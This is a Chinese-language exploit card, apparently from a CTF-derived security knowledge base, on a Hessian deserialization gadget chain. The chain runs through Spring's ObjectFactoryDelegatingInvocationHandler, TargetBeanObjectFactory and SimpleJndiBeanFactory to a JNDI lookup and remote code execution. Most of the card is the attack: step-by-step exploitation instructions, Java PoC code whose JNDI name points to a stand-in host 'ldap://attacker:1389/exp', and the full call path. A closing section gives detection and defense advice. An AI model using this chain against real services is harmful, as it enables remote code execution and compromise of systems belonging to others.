---
id: web-java-deser-hessian-spring-proxy-invocationhandler-jndi
title: Hessian 动态代理触发 Spring InvocationHandler 链到 JNDI：ObjectFactoryDelegatingInvocationHandler→TargetBeanObjectFactory→SimpleJndiBeanFactory
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: hessian-spring-invocationhandler-jndi
aliases:
- Spring 动态代理 JNDI 链
- ObjectFactoryDelegatingInvocationHandler gadget
- TargetBeanObjectFactory getObject 链
- Hessian TreeMap compareTo 代理链
- Maybe 动态代理链
- InvocationHandler 到 SimpleJndiBeanFactory
tags:
- java
- hessian
- deserialization
- spring
- jndi
- dynamic-proxy
- invocationhandler
- treemap
- rce
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:06:05+08:00'
  notes: 已对照原文与18张截图核对：Hessian 4.0.66、白名单5包、Maybe.compareTo→TreeMap回调、ObjectFactoryDelegatingInvocationHandler默认分支、TargetBeanObjectFactory.getObject→SimpleJndiBeanFactory.getBean→lookup、EXP字段设置均一致；未验证点：未复跑EXP，原题为RCTF 2025且Maybe为题目提供。
---

## 一句话结论

当 Hessian 反序列化的类允许列表放行了 `org.springframework.beans.` 与 `org.springframework.jndi.` 时，`TreeMap.put` 对 key 调用 `compareTo` 会进入动态代理的 `InvocationHandler.invoke`；Spring 的 `AutowireUtils$ObjectFactoryDelegatingInvocationHandler` 在默认分支调用 `objectFactory.getObject()`，若把该 `ObjectFactory` 构造成 `ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory`，其 `getObject()` 会执行 `beanFactory.getBean(targetBeanName)`，beanFactory 为 `SimpleJndiBeanFactory` 时即触发 JNDI lookup，最终由 LDAP/RMI 返回的恶意对象完成 RCE。

## 原理

- **入口**：Hessian 的 `MapDeserializer.readMap` 逐对执行 `map.put(key, value)`；`TreeMap.put` 在没有 comparator 时调用 `((Comparable) k1).compareTo(k2)`（`TreeMap.compare`）。若 key 是一个实现了 `Comparable` 的动态代理，`compareTo` 会分派到其 `InvocationHandler.invoke(proxy, Method(compareTo), args)`。
- **Handler 选择**：`org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler` 是实现了 `InvocationHandler` 与 `Serializable` 的私有静态内部类。其 `invoke` 对 `equals`/`hashCode`/`toString` 有专门分支，其余方法走默认分支 `method.invoke(this.objectFactory.getObject(), args)`。因此只要代理被调用任意非上述三个方法（本题是 `compareTo`），就会先执行 `objectFactory.getObject()`。
- **ObjectFactory 链**：`org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory` 实现 `ObjectFactory`，其 `getObject()` 直接 `return this.beanFactory.getBean(this.targetBeanName);`。两个字段都可被反序列化/反射写入。
- **JNDI sink**：`org.springframework.jndi.support.SimpleJndiBeanFactory.getBean(String)` 转调 `getBean(name, Object.class)`；非 singleton 分支执行 `lookup(name, requiredType)`，经 `JndiTemplate.lookup` 到达 `InitialContext.lookup`。`targetBeanName` 直接就是 `ldap://attacker/xxx`。
- **为什么能绕过允许列表**：允许列表按包前缀 `startsWith` 判定，而这条链的每一环都落在被放行的前缀内——`AutowireUtils$ObjectFactoryDelegatingInvocationHandler` 在 `org.springframework.beans.factory.support`、`TargetBeanObjectFactory` 在 `org.springframework.beans.factory.config`、`SimpleJndiBeanFactory` 在 `org.springframework.jndi.support`，加上 JDK 的 `java.util.TreeMap`/`HashSet`，无需任何白名单外的类。
- **代理 key 的来源**：Hessian 按类名加载并实例化具体类，不能直接反序列化运行期生成的 `$Proxy0`。题目提供了一个 `extends Proxy implements Comparable, Serializable`、构造器接收 `InvocationHandler` 的 `Maybe` 类。原生 Java 反序列化场景则可直接用 JDK 动态代理（序列化流会按接口重建代理类），把同样的 handler 包进 `Comparable` 代理作为 `TreeMap` key。

## 触发条件

- Hessian 1/2 反序列化入口可控，且类允许列表放行了 `org.springframework.beans.`、`org.springframework.jndi.`（或未启用允许列表）。
- classpath 含 `spring-beans` 与 `spring-context`（原文环境为 5.3.23）以及 `com.caucho:hessian`；本条链依赖的类在 Spring 5.x 中存在。
- 能构造/取得一个可被 Hessian 实例化的 Proxy 子类：实现 `Comparable`、`Serializable`，构造器接收 `InvocationHandler`（CTF 中由题目提供；真实目标需存在类似类，原生 Java 反序列化可用 JDK Proxy）。
- 目标可出站访问攻击者的 LDAP/RMI 服务（或可利用本地 JNDI 工厂），且 JDK 版本允许对应 JNDI 载荷。
- handler 的 `objectFactory`、`TargetBeanObjectFactory` 的 `beanFactory`/`targetBeanName` 等字段可写入（Hessian 的 `UnsafeDeserializer` 可写 final 字段；构造 payload 时也可用 `Unsafe`/反射）。

## 利用步骤

1. 确认 Hessian 入口及允许列表范围，确认 classpath 中有 spring-beans、spring-context。
2. 构造 `SimpleJndiBeanFactory`：设置 `jndiTemplate`（`new JndiTemplate()` 即可），按需设置 `shareableResources`，使其走 `lookup` 分支。
3. 构造 `TargetBeanObjectFactory`：`beanFactory` 指向该 `SimpleJndiBeanFactory`，`targetBeanName` 设为 `ldap://attacker:1389/exp`。
4. 构造 `ObjectFactoryDelegatingInvocationHandler`：`objectFactory` 指向 `TargetBeanObjectFactory`。
5. 用 Proxy 子类包装该 handler，并把它做成 `TreeMap` 的 key。为避免构造 payload 时在本地触发 `compareTo`，先放入普通 entry，再用反射改写 `TreeMap` 的 root key。
6. Hessian 序列化该 `TreeMap` 并发送；服务端 `MapDeserializer` 插入 entry 时调用 key 的 `compareTo` → handler `invoke` → `getObject()` → `getBean()` → JNDI lookup。
7. 恶意 LDAP/RMI 返回序列化 gadget（如 `BadAttributeValueExpException` + `TemplatesImpl`/POJO）或远程 `Reference` 工厂，触发命令执行。

## PoC

```java
// 1) TargetBeanObjectFactory：targetBeanName 即 JNDI URL
Class<?> tbo = Class.forName(
    "org.springframework.beans.factory.config.ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory");
Object objectFac = UnsafeTools.getObjectByUnsafe(tbo);
ReflectTools.setFieldValue(objectFac, "targetBeanName", "ldap://attacker:1389/exp");

// 2) SimpleJndiBeanFactory：getBean -> lookup
Object jndiFac = UnsafeTools.getObjectByUnsafe(
    Class.forName("org.springframework.jndi.support.SimpleJndiBeanFactory"));
ReflectTools.setFieldValue(jndiFac, "jndiTemplate", new JndiTemplate());
ReflectTools.setFieldValue(jndiFac, "shareableResources", new HashSet<>(Arrays.asList("any")));
ReflectTools.setFieldValue(objectFac, "beanFactory", jndiFac);

// 3) 动态代理 handler：invoke 默认分支调用 objectFactory.getObject()
InvocationHandler handler = (InvocationHandler) UnsafeTools.getObjectByUnsafe(Class.forName(
    "org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler"));
ReflectTools.setFieldValue(handler, "objectFactory", objectFac);

// 4) 题目提供的 Proxy 子类：extends Proxy implements Comparable
Maybe key = new Maybe(handler);

// 5) 先放普通 entry，再反射把 root key 换成代理，避免本地触发
TreeMap<Object, Object> map = new TreeMap<>();
map.put("any", "foo");
ReflectTools.makeTreeMap(map, key);

HessianFactory.deserialize(HessianFactory.serialize(map)); // 发送序列化串到目标
```

关键调用路径：

```text
TreeMap.put -> TreeMap.compare -> Maybe.compareTo
  -> Maybe.h.invoke(proxy, compareTo, args)
  -> AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke
  -> TargetBeanObjectFactory.getObject()
  -> SimpleJndiBeanFactory.getBean(targetBeanName)
  -> SimpleJndiBeanFactory.lookup -> JndiTemplate.lookup -> InitialContext.lookup
```

## 变体与关联

- `ObjectFactoryDelegatingInvocationHandler` 的触发不限于 `compareTo`：任何经代理调用的非 `equals`/`hashCode`/`toString` 方法都会执行 `getObject()`；也可用于其他反序列化入口（如 Fastjson2 getter 绕过中同一 handler 的用法）。
- 同一白名单内其他 `InvocationHandler`：`EarlySingletonInvocationHandler` 只特判 `equals`/`hashCode`/`toString`，`compareTo` 落到 `method.invoke(getSingletonInstance(), args)`，参数为代理对象、难以利用；`ServiceLocatorFactoryBean$ServiceLocatorInvocationHandler` 会走 `beanFactory.getBean(beanName, type)`，但 `beanName` 来自方法参数、本场景不可控。
- JNDI 载荷可换：旧 JDK 用 `Reference` + 远程 `ObjectFactory`；高版本用 LDAP 返回序列化数据（`BadAttributeValueExpException` + `TemplatesImpl`/POJO，java-chains 可生成）。
- 关联卡片：[[web-java-deser-hessian-jndi-outbound-chains]]（Spring `PartiallyComparableAdvisorHolder`/`AbstractBeanFactoryPointcutAdvisor` 两条 JNDI 链）；[[web-java-deser-hessian-deserialization-entry-map-put]]（`TreeMap.put`/`compareTo` 入口）；[[web-java-deserialization-fastjson2-serialize-getter-templates-proxy-bypass]]（同一 handler 的另一种代理绕过）。

## 检测与防御

- 允许列表不要按包前缀放行整个 `org.springframework.*` 或 `org.springframework.beans.`；改为精确类白名单，至少拒绝 `AutowireUtils$ObjectFactoryDelegatingInvocationHandler`、`ObjectFactoryCreatingFactoryBean$TargetBeanObjectFactory`、`SimpleJndiBeanFactory`。
- 业务无需 JNDI 时移除/隔离 `spring-context` 的 JNDI 支持，禁止对不可信名称调用 `JndiTemplate.lookup`。
- 限制服务端出站 LDAP/RMI（1389/1099 及非常规端口），出站代理白名单。
- 升级 JDK（8u191+ 默认关闭 LDAP 远程 codebase）并设置 `com.sun.jndi.ldap.object.trustURLCodebase=false`、`com.sun.jndi.ldap.object.trustSerialData=false`。
- 监控反序列化流中出现 Proxy 子类、`$` 内部类（`AutowireUtils$`、`ObjectFactoryCreatingFactoryBean$`）以及 `TreeMap.compareTo -> InvocationHandler.invoke -> InitialContext.lookup` 的调用序列。
